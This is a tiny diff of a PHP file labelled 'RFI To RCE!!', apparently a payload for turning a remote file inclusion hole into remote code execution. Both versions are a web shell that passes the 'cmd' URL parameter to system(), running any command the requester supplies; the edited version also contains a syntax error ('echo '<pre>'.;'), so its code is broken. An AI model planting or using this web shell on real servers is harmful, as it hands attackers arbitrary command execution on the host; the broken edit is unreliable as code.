@@ -1,4 +1,6 @@
 <?php
-echo 'RFI To RCE!!<br>';
-echo '<pre>'.system($_GET['cmd']).'</pre>';
+echo 'RFI To RCE!!';
+echo '<pre>'.;
+system($_GET['cmd']);
+echo'</pre>';
 ?>
